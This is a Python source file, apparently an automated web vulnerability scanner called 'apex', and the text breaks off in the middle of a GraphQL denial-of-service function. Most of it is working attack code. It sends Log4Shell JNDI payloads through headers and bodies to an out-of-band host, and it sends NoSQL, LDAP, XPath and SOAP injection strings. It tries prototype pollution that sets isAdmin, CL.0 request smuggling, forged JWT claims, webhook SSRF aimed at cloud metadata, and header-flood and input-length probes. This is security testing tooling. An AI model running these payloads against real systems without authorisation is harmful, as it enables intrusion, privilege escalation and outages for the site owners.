        f"${{${{upper:j}}${{upper:n}}${{upper:d}}${{upper:i}}:ldap://{oob}/{uid}}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{oob}/{uid}}}",
        f"${{j${{:}}ndi:ldap://{oob}/{uid}}}",
    ]

    # Inject into every possible input vector
    for target in web_targets[:10]:
        for payload in log4j_payloads[:4]:
            try:
                # Headers (most common vector)
                _S.get(target, headers={
                    "User-Agent": payload,
                    "X-Forwarded-For": payload,
                    "Referer": payload,
                    "X-Api-Version": payload,
                    "Authorization": f"Bearer {payload}",
                    "Accept-Language": payload,
                }, timeout=_TIMEOUT_SHORT)
                # Query param
                _S.get(f"{target}?q={urllib.parse.quote(payload)}", timeout=_TIMEOUT_SHORT)
                # POST body
                _S.post(target, data=payload,
                        headers={"Content-Type": "text/plain"}, timeout=_TIMEOUT_SHORT)
            except Exception:
                pass

    # Check for callbacks
    time.sleep(4)
    try:
        import requests
        r = requests.get(f"http://{oob}/poll?uid={uid}", timeout=3)
        if r.json().get("hit"):
            findings.append({
                "type": "Log4Shell RCE (CVE-2021-44228) — OOB Confirmed",
                "severity": "critical",
                "url": web_targets[0] if web_targets else "multiple",
                "detail": f"Log4Shell triggered! JNDI lookup reached {oob}. Full RCE possible via LDAP/RMI.",
                "template": "apex-log4shell-oob",
            })
        r2 = requests.get(f"http://{oob}/dns", timeout=3)
        if uid in str(r2.json()):
            findings.append({
                "type": "Log4Shell (DNS Callback Confirmed)",
                "severity": "critical",
                "url": web_targets[0] if web_targets else "multiple",
                "detail": "Log4j JNDI DNS lookup confirmed. Server is vulnerable to Log4Shell.",
                "template": "apex-log4shell-dns",
            })
    except Exception:
        pass
    return findings


# ---------------------------------------------------------------------------
# Batch 35 — Crawl improvements: API inference, JS route extraction, auth chain
# ---------------------------------------------------------------------------

def infer_api_endpoints(crawl_data, web_targets):
    """Infer undocumented API endpoints from patterns in discovered URLs.
    If we see /api/users/1, try /api/users, /api/users/2, /api/users/1/settings, etc."""
    inferred = {}  # url -> [params]

    # Collect all known API paths
    api_paths = set()
    for url in crawl_data.get("params", {}).keys():
        if "/api/" in url or "/v1/" in url or "/v2/" in url:
            api_paths.add(url.split("?")[0])
    for page in crawl_data.get("pages", []):
        if "/api/" in page["url"] or "/v1/" in page["url"]:
            api_paths.add(page["url"].split("?")[0])

    # Infer related endpoints
    for path in list(api_paths):
        parts = path.rstrip("/").split("/")
        # If path ends with a number, try the collection endpoint
        if parts and parts[-1].isdigit():
            collection = "/".join(parts[:-1])
            inferred[collection] = ["limit", "offset", "page", "sort", "filter"]
            # Try sub-resources
            for sub in ["settings", "profile", "orders", "payments", "permissions",
                        "roles", "tokens", "sessions", "logs", "activity"]:
                inferred[f"{path}/{sub}"] = []

        # If path has /resource/id pattern, try CRUD operations
        for i, part in enumerate(parts):
            if part.isdigit() and i > 0:
                base = "/".join(parts[:i])
                inferred[base] = ["limit", "page", "search", "q", "filter", "sort"]

    # Verify which inferred endpoints actually exist
    findings_urls = list(inferred.keys())[:30]
    live_endpoints = {}
    for url, r in batch_get(findings_urls, timeout=_TIMEOUT_SHORT):
        if r and r.status_code == 200 and len(r.text) > 20:
            live_endpoints[url] = inferred.get(url, [])

    # Merge into crawl_data params
    for url, params in live_endpoints.items():
        if url not in crawl_data.get("params", {}):
            crawl_data.setdefault("params", {})[url] = params

    return live_endpoints


def extract_js_routes(crawl_data, web_targets):
    """Extract frontend routes from JavaScript bundles — finds hidden pages and API calls."""
    routes = set()
    api_endpoints = set()

    # Patterns that indicate routes/endpoints in JS
    route_patterns = [
        re.compile(r'''path:\s*['"](/[^'"]{2,50})['"]'''),  # React Router
        re.compile(r'''route\(['"](/[^'"]{2,50})['"]'''),  # Vue Router
        re.compile(r'''navigate\(['"](/[^'"]{2,50})['"]'''),
        re.compile(r'''href:\s*['"](/[^'"]{2,50})['"]'''),
        re.compile(r'''url:\s*['"](/api/[^'"]{2,80})['"]'''),
        re.compile(r'''endpoint:\s*['"]([^'"]{5,80})['"]'''),
        re.compile(r'''fetch\(['"]([^'"]{5,80})['"]'''),
        re.compile(r'''axios\.\w+\(['"]([^'"]{5,80})['"]'''),
        re.compile(r'''\.get\(['"]([^'"]{5,80})['"]'''),
        re.compile(r'''\.post\(['"]([^'"]{5,80})['"]'''),
        re.compile(r'''\.put\(['"]([^'"]{5,80})['"]'''),
        re.compile(r'''\.delete\(['"]([^'"]{5,80})['"]'''),
    ]

    # Collect JS URLs
    js_urls = set()
    for page in crawl_data.get("pages", [])[:15]:
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT_SHORT)
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', r.text):
                src = m.group(1)
                js_urls.add(src if src.startswith("http") else urllib.parse.urljoin(page["url"], src))
        except Exception:
            continue

    # Also try common bundle paths
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for pattern in ["/static/js/main.", "/static/js/app.", "/_next/static/chunks/",
                        "/assets/index.", "/dist/app.", "/bundle.js", "/app.js"]:
            try:
                r = _S.get(f"{base}{pattern}", timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 1000:
                    js_urls.add(f"{base}{pattern}")
            except Exception:
                continue

    # Extract routes from JS files
    for js_url, r in batch_get(list(js_urls)[:20], timeout=_TIMEOUT):
        if r is None or r.status_code != 200:
            continue
        content = r.text
        for pattern in route_patterns:
            for m in pattern.finditer(content):
                path = m.group(1)
                if path.startswith("/api") or path.startswith("http"):
                    api_endpoints.add(path)
                elif path.startswith("/"):
                    routes.add(path)

    # Add discovered routes to crawl data
    base = web_targets[0].rstrip("/") if web_targets else ""
    for route in routes:
        full_url = f"{base}{route}"
        if full_url not in crawl_data.get("params", {}):
            crawl_data.setdefault("params", {})[full_url] = []
    for ep in api_endpoints:
        full_url = ep if ep.startswith("http") else f"{base}{ep}"
        if full_url not in crawl_data.get("params", {}):
            crawl_data.setdefault("params", {})[full_url] = []

    return {"routes": list(routes), "api_endpoints": list(api_endpoints)}


def scan_auth_chain_test(crawl_data, web_targets, auth=None):
    """Test the full authentication chain for weaknesses:
    - Token generation predictability
    - Session invalidation on logout
    - Concurrent session handling
    - Token reuse after password change
    """
    findings = []
    if not auth:
        return findings

    username, password = auth
    base = web_targets[0].rstrip("/") if web_targets else ""

    # Find login endpoint
    login_url = None
    for path in ["/api/login", "/api/auth/login", "/login", "/api/auth", "/auth/login"]:
        try:
            r = _S.post(f"{base}{path}",
                        json={"email": username, "username": username, "password": password},
                        timeout=_TIMEOUT)
            if r.status_code == 200 and any(x in r.text.lower() for x in ["token", "session", "jwt"]):
                login_url = f"{base}{path}"
                break
        except Exception:
            continue

    if not login_url:
        return findings

    # Test 1: Get two tokens and check if they're predictable
    tokens = []
    for _ in range(3):
        try:
            r = _S.post(login_url,
                        json={"email": username, "username": username, "password": password},
                        timeout=_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                token = data.get("token") or data.get("access_token") or data.get("jwt")
                if token:
                    tokens.append(token)
        except Exception:
            break

    if len(tokens) >= 2:
        # Check if tokens share common prefix (weak randomness)
        common_prefix = os.path.commonprefix(tokens)
        if len(common_prefix) > len(tokens[0]) * 0.5:
            findings.append({
                "type": "Predictable Token Generation",
                "severity": "high",
                "url": login_url,
                "detail": f"Tokens share {len(common_prefix)}/{len(tokens[0])} char prefix. Weak randomness.",
                "template": "apex-auth-predictable-token",
            })

    # Test 2: Session not invalidated on logout
    if tokens:
        token = tokens[0]
        # Find logout endpoint
        for path in ["/api/logout", "/logout", "/api/auth/logout"]:
            try:
                _S.post(f"{base}{path}",
                        headers={"Authorization": f"Bearer {token}"}, timeout=_TIMEOUT_SHORT)
            except Exception:
                continue

        # Try using the old token
        for path in ["/api/me", "/api/user", "/api/profile"]:
            try:
                r = _S.get(f"{base}{path}",
                           headers={"Authorization": f"Bearer {token}"}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 50:
                    findings.append({
                        "type": "Session Not Invalidated on Logout",
                        "severity": "high",
                        "url": f"{base}{path}",
                        "detail": "Token still valid after logout. Session fixation / token reuse possible.",
                        "template": "apex-auth-no-invalidation",
                    })
                    break
            except Exception:
                continue

    return findings


# ---------------------------------------------------------------------------
# Batch 36 — NoSQL deep, prototype pollution exploit, CL.0 smuggling, CT monitoring
# ---------------------------------------------------------------------------

def scan_nosql_deep(crawl_data):
    """Deep NoSQL injection — MongoDB, CouchDB, Redis operator injection with data extraction."""
    findings = []
    nosql_payloads = [
        # MongoDB operator injection
        ('{"$gt":""}', "MongoDB $gt operator"),
        ('{"$ne":"invalid"}', "MongoDB $ne operator"),
        ('{"$regex":".*"}', "MongoDB $regex"),
        ('{"$where":"sleep(3000)"}', "MongoDB $where (timing)"),
        ('[$ne]=1', "MongoDB array injection"),
        # Authentication bypass
        ('{"$gt":""}', "auth bypass $gt"),
    ]

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            for payload, desc in nosql_payloads[:4]:
                # Try as query param with MongoDB syntax
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    # Also try as array notation: param[$ne]=1
                    r2 = _S.get(f"{url.split('?')[0]}?{p}[$ne]=1&{p}[$gt]=", timeout=_TIMEOUT)

                    for resp in [r, r2]:
                        if resp.status_code == 200 and len(resp.text) > 100:
                            # Check if we got more data than expected (bypass)
                            r_normal = _S.get(url, timeout=_TIMEOUT_SHORT)
                            if len(resp.text) > len(r_normal.text) + 200:
                                findings.append({
                                    "type": f"NoSQL Injection ({desc})",
                                    "severity": "critical",
                                    "url": test_url,
                                    "detail": f"Param '{p}' accepts NoSQL operators. Response +{len(resp.text)-len(r_normal.text)} bytes vs normal.",
                                    "template": "apex-nosql-deep",
                                })
                                break
                except Exception:
                    continue

            # Try JSON body injection for POST endpoints
            base_url = url.split("?")[0]
            for payload, desc in nosql_payloads[:3]:
                try:
                    body = {p: json.loads(payload) if payload.startswith("{") else payload}
                    r = _S.post(base_url, json=body, timeout=_TIMEOUT)
                    if r.status_code == 200 and len(r.text) > 100:
                        if "error" not in r.text.lower()[:100]:
                            findings.append({
                                "type": f"NoSQL Injection via JSON Body ({desc})",
                                "severity": "critical",
                                "url": base_url,
                                "detail": f"JSON body with {desc} accepted on field '{p}'",
                                "template": "apex-nosql-json",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_prototype_pollution_exploit(crawl_data, web_targets):
    """Prototype pollution exploitation — not just detection, but proving impact.
    Tests if polluting __proto__ actually changes application behavior."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")

        # Test 1: Pollute via JSON merge endpoint, then check if behavior changes
        merge_endpoints = ["/api/settings", "/api/user/preferences", "/api/config",
                           "/api/profile", "/api/update"]

        for ep in merge_endpoints:
            url = f"{base}{ep}"
            try:
                # Send pollution payload
                pollution_payloads = [
                    {"__proto__": {"isAdmin": True, "role": "admin"}},
                    {"constructor": {"prototype": {"isAdmin": True}}},
                    {"__proto__": {"status": 200, "verified": True}},
                ]
                for payload in pollution_payloads:
                    r = _S.post(url, json=payload, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 204):
                        # Check if pollution took effect
                        r2 = _S.get(url, timeout=_TIMEOUT_SHORT)
                        if "admin" in r2.text.lower() or "isAdmin" in r2.text:
                            findings.append({
                                "type": "Prototype Pollution → Privilege Escalation",
                                "severity": "critical",
                                "url": url,
                                "detail": f"__proto__.isAdmin=true accepted and reflected. Server-side prototype polluted.",
                                "template": "apex-pp-exploit",
                            })
                            break

                    # Also try via query string
                    pp_url = f"{url}?__proto__[isAdmin]=true&__proto__[role]=admin"
                    r3 = _S.get(pp_url, timeout=_TIMEOUT)
                    if r3.status_code == 200 and ("admin" in r3.text.lower() or "isAdmin" in r3.text):
                        findings.append({
                            "type": "Prototype Pollution via Query String",
                            "severity": "critical",
                            "url": pp_url,
                            "detail": "Query string __proto__ pollution changes server behavior",
                            "template": "apex-pp-query",
                        })
                        break
            except Exception:
                continue

    # Test 2: Client-side prototype pollution via URL fragment/params
    for url, params in list(crawl_data.get("params", {}).items())[:10]:
        for p in params:
            pp_payloads = [
                f"__proto__[test]=polluted",
                f"constructor.prototype.test=polluted",
                f"__proto__.test=polluted",
            ]
            for payload in pp_payloads:
                test_url = f"{url}{'&' if '?' in url else '?'}{payload}"
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if "polluted" in r.text and "__proto__" not in r.text:
                        findings.append({
                            "type": "Prototype Pollution (Reflected)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Pollution payload reflected without __proto__ key — server processes it",
                            "template": "apex-pp-reflected",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_cl0_smuggling(web_targets):
    """CL.0 request smuggling — Content-Length: 0 with body to desync front/backend."""
    findings = []
    import socket, ssl

    for target in web_targets[:5]:
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80

        try:
            # CL.0: Send Content-Length: 0 but include a body
            # If backend processes the body as a new request, we have smuggling
            smuggle_request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
                f"GET /apex-smuggle-detect HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            )

            sock = socket.create_connection((host, port), timeout=5)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(smuggle_request.encode())
            sock.settimeout(5)

            # Read responses
            responses = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    responses += chunk
            except socket.timeout:
                pass
            sock.close()

            # If we get two HTTP responses, smuggling worked
            response_count = responses.count(b"HTTP/1.")
            if response_count >= 2:
                findings.append({
                    "type": "HTTP Request Smuggling (CL.0)",
                    "severity": "critical",
                    "url": target,
                    "detail": f"CL.0 desync confirmed — {response_count} responses to 1 connection. Can poison cache, bypass auth.",
                    "template": "apex-smuggling-cl0",
                })
        except Exception:
            continue
    return findings


def scan_subdomain_ct_realtime(target):
    """Real-time certificate transparency monitoring — find new subdomains as they're issued."""
    findings = []
    subdomains = set()

    # Query multiple CT log sources
    ct_sources = [
        f"https://crt.sh/?q=%.{target}&output=json",
        f"https://api.certspotter.com/v1/issuances?domain={target}&include_subdomains=true&expand=dns_names",
    ]

    for source in ct_sources:
        try:
            r = requests.get(source, timeout=15)
            if r.status_code != 200:
                continue
            data = r.json()
            for entry in data:
                # crt.sh format
                if "common_name" in entry:
                    name = entry["common_name"].lower()
                    if name.endswith(f".{target}") and "*" not in name:
                        subdomains.add(name)
                    # Also check name_value for SANs
                    for name in entry.get("name_value", "").split("\n"):
                        name = name.strip().lower()
                        if name.endswith(f".{target}") and "*" not in name:
                            subdomains.add(name)
                # certspotter format
                if "dns_names" in entry:
                    for name in entry["dns_names"]:
                        name = name.lower()
                        if name.endswith(f".{target}") and "*" not in name:
                            subdomains.add(name)
        except Exception:
            continue

    # Check for interesting subdomains that might be new/unprotected
    interesting_prefixes = ["staging", "dev", "test", "beta", "internal", "admin",
                           "api-dev", "api-staging", "preprod", "uat", "sandbox",
                           "debug", "old", "new", "v2", "next", "preview"]

    interesting_found = [s for s in subdomains
                         if any(s.startswith(f"{p}.") for p in interesting_prefixes)]

    if interesting_found:
        # Check which are alive
        check_urls = [f"https://{s}" for s in interesting_found[:20]]
        alive = []
        for url, r in batch_get(check_urls, timeout=5):
            if r and r.status_code < 500:
                alive.append(url)

        if alive:
            findings.append({
                "type": f"Interesting Subdomains via CT ({len(alive)} alive)",
                "severity": "medium",
                "url": alive[0],
                "detail": f"Found {len(interesting_found)} interesting subdomains via CT logs. Alive: {', '.join(s.replace('https://','') for s in alive[:5])}",
                "template": "apex-ct-interesting",
            })

    return findings, list(subdomains)


# ---------------------------------------------------------------------------
# Batch 37 — LDAP deep, XML injection, HTTP/2 attacks, token manipulation
# ---------------------------------------------------------------------------

def scan_ldap_deep(crawl_data):
    """Deep LDAP injection — authentication bypass and data extraction."""
    findings = []
    ldap_payloads = [
        ("*)(uid=*))(|(uid=*", "wildcard auth bypass"),
        ("*)(|(password=*", "password extraction"),
        ("admin)(&)", "filter termination"),
        ("*))%00", "null byte termination"),
        (")(cn=*)(|(cn=*", "CN enumeration"),
    ]

    # Target login/search endpoints
    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        lower = url.lower()
        if not any(x in lower for x in ["login", "auth", "search", "user", "ldap", "directory", "lookup"]):
            continue
        for p in params[:3]:
            if not any(x in p.lower() for x in ["user", "name", "uid", "cn", "dn", "login", "search", "query"]):
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            for payload, desc in ldap_payloads:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    # LDAP injection indicators
                    if r.status_code == 200 and len(r.text) > 100:
                        if any(x in r.text.lower() for x in ["dn:", "cn=", "uid=", "objectclass",
                                                               "ldap", "distinguished"]):
                            findings.append({
                                "type": f"LDAP Injection ({desc})",
                                "severity": "critical",
                                "url": test_url,
                                "detail": f"LDAP data returned via param '{p}'. Payload: {payload}",
                                "template": "apex-ldap-deep",
                            })
                            break
                    # Auth bypass: got 200 where we shouldn't
                    if "login" in lower and r.status_code == 200:
                        if any(x in r.text.lower() for x in ["welcome", "dashboard", "profile", "token"]):
                            findings.append({
                                "type": "LDAP Authentication Bypass",
                                "severity": "critical",
                                "url": test_url,
                                "detail": f"LDAP auth bypass via '{p}' with payload: {payload}",
                                "template": "apex-ldap-auth-bypass",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_xml_injection(crawl_data, web_targets):
    """XML injection — SOAP injection, XPath injection via XML-accepting endpoints."""
    findings = []
    xml_payloads = [
        # XPath injection
        ("' or '1'='1", "XPath auth bypass"),
        ("' or ''='", "XPath tautology"),
        ("1 or 1=1", "XPath numeric"),
        # XML entity injection (non-XXE)
        ("<![CDATA[<script>alert(1)</script>]]>", "CDATA XSS"),
        # SOAP injection
        ("</name><role>admin</role><name>", "SOAP element injection"),
    ]

    for url, params in list(crawl_data.get("params", {}).items())[:15]:
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            for payload, desc in xml_payloads[:3]:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200:
                        if "xpath" in r.text.lower() or "xml" in r.text.lower():
                            if any(x in r.text.lower() for x in ["syntax", "error", "exception"]):
                                findings.append({
                                    "type": f"XML/XPath Injection ({desc})",
                                    "severity": "high",
                                    "url": test_url,
                                    "detail": f"XPath/XML error triggered via param '{p}'",
                                    "template": "apex-xml-inject",
                                })
                                break
                except Exception:
                    continue

    # Test SOAP endpoints
    for target in web_targets[:5]:
        base = target.rstrip("/")
        soap_paths = ["/ws", "/soap", "/service", "/api/soap", "/wsdl"]
        for path in soap_paths:
            url = f"{base}{path}"
            soap_body = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><test>apex' or '1'='1</test></soap:Body>
</soap:Envelope>"""
            try:
                r = _S.post(url, data=soap_body,
                            headers={"Content-Type": "text/xml"}, timeout=_TIMEOUT)
                if r.status_code == 200 and "soap" in r.text.lower():
                    if any(x in r.text.lower() for x in ["fault", "error", "exception"]):
                        findings.append({
                            "type": "SOAP Injection",
                            "severity": "high",
                            "url": url,
                            "detail": "SOAP endpoint processes injected XML — possible data extraction",
                            "template": "apex-soap-inject",
                        })
            except Exception:
                continue
    return findings


def scan_http2_exclusive(web_targets):
    """HTTP/2-exclusive attacks — HPACK bomb, pseudo-header injection, stream manipulation."""
    findings = []
    try:
        import httpx
    except ImportError:
        return findings

    for target in web_targets[:5]:
        try:
            # Test with HTTP/2
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                # Test 1: Duplicate pseudo-headers (should be rejected)
                try:
                    r = client.get(target, headers={":authority": "evil.com"})
                    if r.status_code == 200 and "evil.com" in r.text:
                        findings.append({
                            "type": "HTTP/2 Pseudo-Header Injection",
                            "severity": "high",
                            "url": target,
                            "detail": "Server accepts injected :authority pseudo-header — request routing manipulation",
                            "template": "apex-h2-pseudo-header",
                        })
                except Exception:
                    pass

                # Test 2: Header name with uppercase (HTTP/2 requires lowercase)
                try:
                    r = client.get(target, headers={"Transfer-Encoding": "chunked"})
                    # If server processes this, it might be vulnerable to smuggling
                except Exception:
                    pass

                # Test 3: Large header bomb (HPACK)
                try:
                    big_headers = {f"x-apex-{i}": "A" * 1000 for i in range(50)}
                    r = client.get(target, headers=big_headers)
                    if r.status_code == 200:
                        findings.append({
                            "type": "HTTP/2 No Header Size Limit",
                            "severity": "low",
                            "url": target,
                            "detail": "Server accepts 50KB+ of headers — potential for HPACK bomb DoS",
                            "template": "apex-h2-header-bomb",
                        })
                except Exception:
                    pass
        except Exception:
            continue
    return findings


def scan_token_manipulation(crawl_data, web_targets):
    """Token manipulation — modify JWT claims, forge session tokens, bypass token validation."""
    import base64 as b64
    findings = []

    # Find tokens in responses
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    for target in web_targets[:5]:
        try:
            r = _S.get(target, timeout=_TIMEOUT)
            tokens = jwt_re.findall(r.text)
            # Also check cookies
            for cookie in r.cookies:
                if jwt_re.match(cookie.value):
                    tokens.append(cookie.value)
        except Exception:
            continue

        for token in tokens[:2]:
            parts = token.split(".")
            if len(parts) < 2:
                continue
            try:
                header = json.loads(b64.urlsafe_b64decode(parts[0] + "=="))
                payload = json.loads(b64.urlsafe_b64decode(parts[1] + "=="))
            except Exception:
                continue

            base = target.rstrip("/")

            # Test 1: Modify claims without re-signing
            modified_payload = dict(payload)
            for key in ["role", "admin", "is_admin", "scope", "permissions"]:
                if key in modified_payload:
                    modified_payload[key] = "admin" if isinstance(modified_payload[key], str) else True
            # Also try changing user ID
            for key in ["sub", "user_id", "uid", "id"]:
                if key in modified_payload:
                    modified_payload[key] = "1" if isinstance(modified_payload[key], str) else 1

            new_payload = b64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b"=").decode()
            tampered_token = f"{parts[0]}.{new_payload}.{parts[2] if len(parts) > 2 else ''}"

            # Test tampered token
            for path in ["/api/me", "/api/user", "/api/admin", "/api/profile"]:
                try:
                    r2 = _S.get(f"{base}{path}",
                                headers={"Authorization": f"Bearer {tampered_token}"},
                                timeout=_TIMEOUT_SHORT)
                    if r2.status_code == 200 and len(r2.text) > 50:
                        if "error" not in r2.text.lower()[:100] and "invalid" not in r2.text.lower()[:100]:
                            findings.append({
                                "type": "JWT Claim Tampering — No Signature Verification",
                                "severity": "critical",
                                "url": f"{base}{path}",
                                "detail": f"Modified JWT claims accepted without signature check. Changed: {list(set(modified_payload.keys()) - set(payload.keys()) | {k for k in payload if payload[k] != modified_payload.get(k)})}",
                                "template": "apex-jwt-tamper",
                            })
                            break
                except Exception:
                    continue

            # Test 2: Expired token still accepted
            if "exp" in payload:
                expired_payload = dict(payload)
                expired_payload["exp"] = 1  # Unix timestamp 1 = 1970
                exp_b64 = b64.urlsafe_b64encode(json.dumps(expired_payload).encode()).rstrip(b"=").decode()
                expired_token = f"{parts[0]}.{exp_b64}.{parts[2] if len(parts) > 2 else ''}"
                for path in ["/api/me", "/api/user"]:
                    try:
                        r3 = _S.get(f"{base}{path}",
                                    headers={"Authorization": f"Bearer {expired_token}"},
                                    timeout=_TIMEOUT_SHORT)
                        if r3.status_code == 200 and len(r3.text) > 50:
                            findings.append({
                                "type": "JWT Expiration Not Enforced",
                                "severity": "high",
                                "url": f"{base}{path}",
                                "detail": "Expired JWT (exp=1970) still accepted. Tokens never expire.",
                                "template": "apex-jwt-no-expiry",
                            })
                            break
                    except Exception:
                        continue
    return findings


# ---------------------------------------------------------------------------
# Batch 38 — Webhook abuse, S3 takeover, DNS rebinding, IDOR chain, input length
# ---------------------------------------------------------------------------

def scan_webhook_abuse(crawl_data, web_targets):
    """Webhook/callback abuse — SSRF via webhook URLs, event injection."""
    findings = []

    webhook_params = ["webhook", "callback", "hook", "notify", "endpoint",
                      "webhook_url", "callback_url", "notification_url", "ping_url"]

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params:
            if not any(x in p.lower() for x in webhook_params):
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            # Point webhook to internal services
            for target_url in ["http://169.254.169.254/latest/meta-data/",
                               "http://127.0.0.1:6379/", "http://127.0.0.1:9200/"]:
                qs[p] = [target_url]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.post(test_url, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 202):
                        if "error" not in r.text.lower()[:100]:
                            findings.append({
                                "type": f"Webhook SSRF ({p})",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"Webhook param '{p}' accepts internal URL. Server will make request to {target_url}",
                                "template": "apex-webhook-ssrf",
                            })
                            break
                except Exception:
                    continue

    # Also check for webhook registration endpoints
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/webhooks", "/api/hooks", "/webhooks", "/api/integrations"]:
            try:
                r = _S.post(f"{base}{path}",
                            json={"url": "http://169.254.169.254/latest/meta-data/",
                                  "events": ["*"]},
                            timeout=_TIMEOUT)
                if r.status_code in (200, 201):
                    findings.append({
                        "type": "Webhook Registration SSRF",
                        "severity": "critical",
                        "url": f"{base}{path}",
                        "detail": "Can register webhooks pointing to internal services. Blind SSRF on every event.",
                        "template": "apex-webhook-reg-ssrf",
                    })
            except Exception:
                continue
    return findings


def scan_s3_bucket_takeover(target, subdomains):
    """S3/cloud bucket takeover — find buckets that can be claimed."""
    findings = []
    # Skip internal/local targets
    if any(x in target for x in ["localhost", "127.0.0.1", "10.", "192.168.", "172."]):
        return findings
    bucket_patterns = [
        f"{target}",
        f"{target.replace('.', '-')}",
        f"www-{target.replace('.', '-')}",
        f"assets-{target.replace('.', '-')}",
        f"static-{target.replace('.', '-')}",
        f"media-{target.replace('.', '-')}",
        f"backup-{target.replace('.', '-')}",
        f"dev-{target.replace('.', '-')}",
        f"staging-{target.replace('.', '-')}",
    ]

    # Check S3
    s3_urls = [f"https://{b}.s3.amazonaws.com/" for b in bucket_patterns]
    for url, r in batch_get(s3_urls, timeout=5):
        if r is None:
            continue
        bucket = url.split("//")[1].split(".s3")[0]
        if r.status_code == 404:
            # Bucket doesn't exist — can be claimed!
            findings.append({
                "type": f"S3 Bucket Takeover ({bucket})",
                "severity": "critical",
                "url": url,
                "detail": f"Bucket '{bucket}' returns 404 — create it on AWS to take over. Check if target references this bucket.",
                "template": "apex-s3-takeover",
            })
        elif r.status_code == 200:
            if "ListBucket" in r.text:
                findings.append({
                    "type": f"S3 Bucket Public Listing ({bucket})",
                    "severity": "high",
                    "url": url,
                    "detail": f"Bucket '{bucket}' allows public listing. Data exposed.",
                    "template": "apex-s3-public",
                })

    # Check GCS
    gcs_urls = [f"https://storage.googleapis.com/{b}/" for b in bucket_patterns[:5]]
    for url, r in batch_get(gcs_urls, timeout=5):
        if r and r.status_code == 200 and "ListBucket" in r.text:
            bucket = url.split("googleapis.com/")[1].rstrip("/")
            findings.append({
                "type": f"GCS Bucket Public ({bucket})",
                "severity": "high",
                "url": url,
                "detail": f"Google Cloud Storage bucket '{bucket}' is publicly listable",
                "template": "apex-gcs-public",
            })
    return findings


def scan_input_length_overflow(crawl_data):
    """Input length overflow — find fields with no max length that cause errors or truncation."""
    findings = []

    for url, params in list(crawl_data.get("params", {}).items())[:15]:
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            # Test with increasingly large inputs
            lengths = [100, 1000, 5000, 50000]
            for length in lengths:
                qs[p] = ["A" * length]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 500:
                        findings.append({
                            "type": f"Input Length Overflow ({p}, {length} chars)",
                            "severity": "medium",
                            "url": test_url[:200],
                            "detail": f"Param '{p}' with {length} chars causes 500 error. Possible buffer overflow or unhandled exception.",
                            "template": "apex-length-overflow",
                        })
                        break
                    if any(x in r.text.lower() for x in ["out of memory", "stack overflow",
                                                           "maximum.*exceeded", "too large"]):
                        findings.append({
                            "type": f"Resource Exhaustion via Input Length ({p})",
                            "severity": "medium",
                            "url": test_url[:200],
                            "detail": f"Param '{p}' at {length} chars triggers resource exhaustion",
                            "template": "apex-length-dos",
                        })
                        break
                except Exception:
                    break  # Timeout = likely DoS
    return findings


def scan_graphql_dos(crawl_data):
    """GraphQL denial of service — deep nesting, circular queries, batch amplification."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)

        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                r = _S.post(url, json={"query": "{ __typename }"}, timeout=_TIMEOUT_SHORT)
                if r.status_code != 200:
                    continue

                # Test 1: Deep nesting
